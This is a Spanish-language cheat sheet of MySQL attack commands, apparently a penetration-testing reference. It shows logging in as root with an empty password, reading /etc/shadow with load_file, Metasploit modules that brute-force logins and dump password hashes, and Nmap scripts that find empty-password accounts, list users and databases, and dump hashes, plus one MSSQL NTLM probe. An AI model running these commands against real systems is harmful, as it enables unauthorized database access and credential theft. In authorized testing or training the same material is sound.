|                               |                                                                                                                 |
| ----------------------------- | --------------------------------------------------------------------------------------------------------------- |
| >mysql -h 192.168.1.1 -u root | nos conectamos con el user root sin passowrd, si lo solicita escribimos -p al final para que aparezca el prompt |

mysql>show databases

mysql>use books        //Cambiamos a la database books

mysql>select * from authors        //Enumera valores de una tabla específica

mysql>select load_file(“/etc/shadow”)        //Muestra el archivo de la ruta del servidor

Metasploit

msf>use auxiliary/scanner/mysql/mysql_writable_dirs   //ataque de diccionario para directorios de MYSQL. Set PASSWORD(“” si no hay), dir_list (ruta del diccionario), rhosts. Colocar Verbose false para evitar la información demás.

msf(scanner/mysql/mysql_writable_dirs)>set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt   //Por ejemplo.

msf>use auxiliary/scanner/mysql/mysql_hashdump   //Lista de hashes. password “” sino hay

msf>use auxiliary/scanner/mysql/mysql_login        //Ataque diccionario en mysql login

Nmap

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-empty-password  //Busca users sin password

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-empty-info    //Información sobre Capabilities

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-users --script-args=”mysqluser=’root’, mysqlpass=’’”                //Enumera los usuarios de la BD

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-databases --script-args=”mysqluser=’root’, mysqlpass=’’”                //Enumera las diferentes DB a las que se puede acceder

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-variables --script-args=”mysqluser=’root’, mysqlpass=’’”                //Importante datadir: /var/lib/mysql/  ruta donde la DB guarda data

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-audit --script-args=”mysql-audit.username=’root’, mysql-audit.password=’’,mysql-audit.filename=’/usr/share/nmap/nselib/data/mysql-cis.audit’” //Realiza una “auditoria” de la BD comparándolo a lineas base en mysql-cis.audit de nmap.

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-dump-hashes --script-args=”username=’root’, password=’’”        //Muestra los hashes encontrados para el DB

>nmap 192.168.1.1 -sV -p 3306 --script=mysql-query --script-args=”query=’select count(*) from books.authors;’, username=’root’, password=’’”        //realizar un query desde nmap.

>nmap 192.168.1.1 -p 1433 --script ms-sql-ntlm-info --script-args msql.instance-port=1433